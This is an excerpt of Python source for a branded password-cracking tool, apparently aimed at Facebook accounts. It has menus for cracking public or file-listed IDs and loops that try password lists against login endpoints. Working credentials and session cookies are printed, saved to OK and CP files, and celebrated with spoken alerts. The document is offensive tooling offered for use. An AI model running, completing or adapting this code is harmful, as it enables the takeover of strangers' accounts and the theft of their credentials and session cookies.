...
os.system('espeak -a 300 " WELCOME TO LMNx9 TOOL"')
...
print('\033[1;37m----------------------------------------------')
animation(' >> YOUR NAME WAS ACCEPTED ')
pass
...
def menu():
    ...
    linex()
    print(f""" [\u001b[36m1\033[1;92m] CRACK PUBLIC """)
    print(f""" [\u001b[36m2\033[1;94m] CRACK FILE         """)
...
def setting():
    linex()
    print(" [\u001b[36m1\033[1;37m]  OLD ID")
    print(" [\u001b[36m2\033[1;37m]  NEW ID")
    print(" [\u001b[36m3\033[1;37m]  MIX ID")
    linex()
    ...
    linex()
    print(" [\u001b[36m1\033[1;37m] Mobile 1 ")
    print(" [\u001b[36m2\033[1;37m] Free 2")
    print(" [\u001b[36m3\033[1;37m] Touch 3")
    print(" [\u001b[36m4\033[1;37m] Mbasic 4")
    linex()
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r {P}[LMNx9-XD💥]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\033[1;31m[LMNx9-CP   \033[1;31m{idf} |  \033[1;31m{pw}  ')
                ...
                print(f'\r\x1b[32[LMNx9-OK]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
                os.system('espeak -a 300 " LMNx9 CRACKED OK ID"')
...
def crackfree(idf,pwv):
    ...
    'viewport-width': '980',}
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print ('\x1b[36m||')
                print(f'\r\033[0;93m[\33[1;96mLMNx9-CP\33[1;93m]  {idf}  {pw} ')
                print ('\x1b[36m||')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print ('\x1b[32m||')
                print(f'\r\33[1;93m[\33[1;92mLMNx9-OK\33[1;93m] \33[1;92m{idf} {pw} ')
                os.system('espeak -a 300 " LMNx9 CRACKED OK ID"')
                print ('\x1b[32m||')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                cek_DYNO(kuki)
